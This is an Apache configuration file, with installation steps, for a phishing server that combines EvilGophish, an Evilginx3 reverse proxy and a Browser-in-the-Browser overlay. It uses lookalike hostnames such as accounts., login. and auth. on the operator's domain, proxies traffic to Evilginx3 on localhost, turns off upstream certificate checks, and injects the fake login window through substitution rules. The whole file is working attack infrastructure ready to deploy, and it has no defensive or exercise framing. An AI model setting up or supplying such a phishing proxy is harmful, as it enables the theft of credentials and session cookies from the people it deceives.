# EvilGophish + Frameless-BitB Apache VirtualHost Configuration
#
# Installation:
# 1. Copy to /etc/apache2/sites-available/bitb.conf
# 2. Replace YOUR_DOMAIN and YOUR_SERVER_IP
# 3. Update SSL certificate paths
# 4. sudo a2ensite bitb && sudo systemctl reload apache2

# HTTPS VirtualHost
<VirtualHost *:443>
    ServerName accounts.YOUR_DOMAIN
    ServerAlias login.YOUR_DOMAIN auth.YOUR_DOMAIN

    # Administrator contact
    ServerAdmin admin@YOUR_DOMAIN

    # SSL/TLS Configuration
    SSLEngine on

    # For Let's Encrypt certificates:
    SSLCertificateFile /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem

    # For self-signed certificates:
    # SSLCertificateFile /etc/apache2/ssl/bitb.crt
    # SSLCertificateKeyFile /etc/apache2/ssl/bitb.key

    # Modern TLS configuration
    SSLProtocol -all +TLSv1.2 +TLSv1.3
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder off
    SSLSessionTickets off

    # OCSP Stapling
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"

    # Security headers
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"

    # Proxy configuration to Evilginx3
    ProxyPreserveHost On
    ProxyPass / https://127.0.0.1:8443/
    ProxyPassReverse / https://127.0.0.1:8443/

    # SSL proxy settings
    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

    # Proxy timeouts
    ProxyTimeout 300
    ProxyBadHeader Ignore

    # Include BitB substitution rules
    # These rules inject the Browser-in-Browser overlay
    Include /etc/apache2/custom-subs/*.conf

    # Enable substitution module
    # Note: May need adjustment based on your substitution files
    SetOutputFilter INFLATE;SUBSTITUTE;DEFLATE

    # Logging
    ErrorLog ${APACHE_LOG_DIR}/bitb-error.log
    CustomLog ${APACHE_LOG_DIR}/bitb-access.log combined

    # Log level (set to debug for troubleshooting)
    LogLevel warn
</VirtualHost>

# HTTP VirtualHost - Redirect to HTTPS
<VirtualHost *:80>
    ServerName accounts.YOUR_DOMAIN
    ServerAlias login.YOUR_DOMAIN auth.YOUR_DOMAIN

    # ACME challenge for Let's Encrypt
    Alias /.well-known/acme-challenge/ /var/www/certbot/.well-known/acme-challenge/
    <Directory "/var/www/certbot/.well-known/acme-challenge/">
        Options None
        AllowOverride None
        ForceType text/plain
        Require all granted
    </Directory>

    # Redirect all other requests to HTTPS
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/.well-known/acme-challenge/
    RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]

    # Logging
    ErrorLog ${APACHE_LOG_DIR}/bitb-http-error.log
    CustomLog ${APACHE_LOG_DIR}/bitb-http-access.log combined
</VirtualHost>

# Optional: Additional security configurations
<IfModule mod_reqtimeout.c>
    RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500
</IfModule>
